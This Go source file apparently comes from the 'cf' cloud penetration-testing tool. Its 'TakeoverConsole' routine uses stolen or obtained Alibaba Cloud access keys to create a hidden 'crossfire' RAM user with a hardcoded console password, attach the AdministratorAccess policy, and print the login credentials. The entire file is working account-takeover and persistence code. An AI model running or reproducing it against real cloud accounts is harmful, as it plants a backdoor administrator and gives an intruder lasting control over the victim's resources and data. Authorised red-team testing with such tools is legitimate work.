package aliram

import (
	"fmt"

	"github.com/aliyun/alibaba-cloud-sdk-go/services/ram"
	log "github.com/sirupsen/logrus"
	"github.com/teamssix/cf/pkg/cloud"
	"github.com/teamssix/cf/pkg/util"
)

func CreateUser() {
	request := ram.CreateCreateUserRequest()
	request.Scheme = "https"
	request.UserName = "crossfire"
	_, err := RAMClient().CreateUser(request)
	util.HandleErrNoExit(err)
	if err == nil {
		log.Debugln("创建 crossfire 用户成功 (Create crossfire user successfully)")
	}
}

func CreateLoginProfile() {
	request := ram.CreateCreateLoginProfileRequest()
	request.Scheme = "https"
	request.UserName = "crossfire"
	request.Password = "TeamsSix_CF@666"
	_, err := RAMClient().CreateLoginProfile(request)
	util.HandleErrNoExit(err)
	if err == nil {
		log.Debugln("成功为 crossfire 用户创建控制台登录密码 (Successfully created console login password for crossfire user)")
	}
}

func AttachPolicyToUser() {
	request := ram.CreateAttachPolicyToUserRequest()
	request.Scheme = "https"
	request.PolicyType = "System"
	request.PolicyName = "AdministratorAccess"
	request.UserName = "crossfire"
	_, err := RAMClient().AttachPolicyToUser(request)
	util.HandleErrNoExit(err)
	if err == nil {
		log.Debugln("成功为 crossfire 用户赋予管理员权限 (Successfully grant AdministratorAccess policy to the crossfire user)")
	}
}

func GetAccountAlias() string {
	request := ram.CreateGetAccountAliasRequest()
	request.Scheme = "https"
	response, err := RAMClient().GetAccountAlias(request)
	util.HandleErrNoExit(err)
	accountAlias := response.AccountAlias
	return accountAlias
}

func TakeoverConsole() {
	CreateUser()
	CreateLoginProfile()
	AttachPolicyToUser()
	accountAlias := GetAccountAlias()
	username := fmt.Sprintf("crossfire@%s", accountAlias)
	data := [][]string{
		{username, "TeamsSix_CF@666", "https://signin.aliyun.com"},
	}
	var header = []string{"用户名", "密码", "控制台登录地址"}
	var td = cloud.TableData{Header: header, Body: data}
	cloud.PrintTable(td, "")
}
